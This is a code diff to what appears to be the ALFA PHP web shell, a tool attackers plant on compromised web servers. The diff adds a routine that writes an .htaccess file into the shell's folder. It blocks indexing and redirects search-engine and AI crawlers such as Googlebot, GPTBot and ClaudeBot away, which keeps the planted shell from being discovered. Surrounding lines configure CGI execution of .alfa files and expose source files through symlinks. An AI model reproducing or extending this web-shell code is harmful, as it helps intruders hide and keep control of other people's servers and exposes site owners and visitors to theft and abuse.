@@ -4687,6 +4687,7 @@ function alfaCreateParentFolder() {
   $parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
   if (!@is_dir($parent)) {
     @mkdir($parent, 0755, true);
+	  alfacgihtaccess('bot', $parent.'/');
   }
 }
 function alfasymlink() {
@@ -5689,15 +5690,18 @@ function alfaportscanner() {
 }
 function alfacgihtaccess($m, $d = '', $symname = false) {
   $readme = "";
+	$bot="\n<IfModule mod_headers.c>\nHeader set X-Robots-Tag \"noindex, nofollow\"\n</IfModule>\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (Googlebot|bingbot|Slurp|Baiduspider|YandexBot||AhrefsBot|MJ12Bot|facebookexternalhit|Twitterbot|LinkedInBot|Slackbot|GPTBot|ChatGPT-User|OAI-SearchBot|ClaudeBot|anthropic-ai|PerplexityBot|spider|bot) [NC]\nRewriteRule (.*) http://google.com [NC,L,R=301]\n</IfModule>\n";
   if ($symname) {
     $readme = "\nReadmeName ".trim($symname);
   }
   if ($m == 'cgi') {
-    $code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
+    $code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa".$bot;
   } elseif ($m == 'sym') {
     $code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
   } elseif ($m == 'shtml') {
     $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
+  } elseif ($m == 'bot'){
+	  $code = $bot;
   }
   @__write_file($d . ".htaccess", $code);
 }
@@ -7099,3 +7103,4 @@ exit;
 #skype : ehsan.invisible
 */
 ?>
+
